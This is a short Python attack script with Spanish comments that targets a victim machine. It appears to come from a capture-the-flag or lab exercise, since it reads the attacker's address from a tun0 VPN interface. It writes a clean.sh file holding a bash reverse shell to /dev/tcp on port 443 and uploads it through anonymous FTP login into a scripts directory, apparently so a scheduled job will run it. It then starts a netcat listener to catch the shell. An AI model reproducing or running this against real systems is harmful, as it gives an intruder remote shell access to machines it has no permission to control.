import time
from ftplib import FTP
import os
import netifaces

ip_victima = input("Introduce la IP de la máquina víctima: ")

def obtener_ip():
    direcciones = netifaces.ifaddresses('tun0')

# Verificar si se encontraron direcciones IP para la interfaz 'tun0'
    if netifaces.AF_INET in direcciones:
        # Obtener la primera dirección IP encontrada en la interfaz 'tun0'
        direccion_ip = direcciones[netifaces.AF_INET][0]['addr']
        print("La dirección IP de la interfaz tun0 es:", direccion_ip)
    else:
        print("No se encontraron direcciones IP para la interfaz tun0")
    return direccion_ip

# Llamada a la función para obtener la dirección IP de tun0
tun0 = obtener_ip()

time.sleep(2)

# Crear el archivo clean.sh

with open("clean.sh", "a") as archivo:
    archivo.write("#!/bin/bash\n\nbash -i >& /dev/tcp/" + tun0 + "/443 0>&1\n")

# Comprobamos la existencia del archivo clean.sh:

if os.path.isfile("clean.sh"):
    print("Se ha creado correctamente el archivo clean.sh malicioso, listo para subir a la máquina víctima")
else:
    print("Hubo un error en el proceso")
    exit(1)


# Subir el archivo al servidor FTP:

def subir_archivo_servidor_ftp(servidor, archivo_local, archivo_remoto):
    try:
        with FTP(servidor) as ftp:
            ftp.login()
            with open(archivo_local, 'rb') as archivo:
                ftp.storbinary(f'STOR {archivo_remoto}', archivo)
            print('Archivo subido exitosamente al servidor FTP.')
            os.remove('clean.sh')
    except Exception as e:
        print(f'Error al subir el archivo al servidor FTP: {e}')


# Configurar los parámetros de conexión y archivos
servidor_ftp = ip_victima
archivo_local = 'clean.sh'
archivo_remoto = 'scripts/clean.sh'

# Llamar a la función para subir el archivo
subir_archivo_servidor_ftp(servidor_ftp, archivo_local, archivo_remoto)

# Nos ponemos en escucha con netcat:

def iniciar_escucha_puerto(puerto):

    try:
        output = os.system(f'nc -nlvp {puerto}')
        print(f"Escucha en el puerto {puerto} iniciada correctamente.")
        print(output)
    except:
        print(f"Error al iniciar la escucha en el puerto {puerto}")

iniciar_escucha_puerto(443)
